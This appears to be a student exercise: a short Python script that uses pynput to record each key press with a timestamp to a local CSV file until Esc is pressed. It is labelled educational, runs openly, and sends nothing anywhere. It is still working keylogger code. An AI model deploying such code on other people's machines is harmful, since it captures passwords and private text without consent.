'''
#Task # 04
Simple Keylogger
'''
#Educational Keylogger with Timestamp Logging (CSV)
# Requires: pip install pynput
# Author-AG: For Educational Purposes Only

import csv
from datetime import datetime
from pynput import keyboard

log_file = "key_log.csv"

# Create CSV file with headers if it doesn't exist
with open(log_file, mode='w', newline='', encoding='utf-8') as f:
    writer = csv.writer(f)
    writer.writerow(["Timestamp", "Key"])

def on_press(key):
    # Get current timestamp
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        key_str = key.char  # Normal keys
    except AttributeError:
        key_str = f"[{key}]"  # Special keys (Enter, Shift, etc.)

    # Write to CSV file
    with open(log_file, mode='a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow([timestamp, key_str])

def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press ESC to stop.")
    listener.join()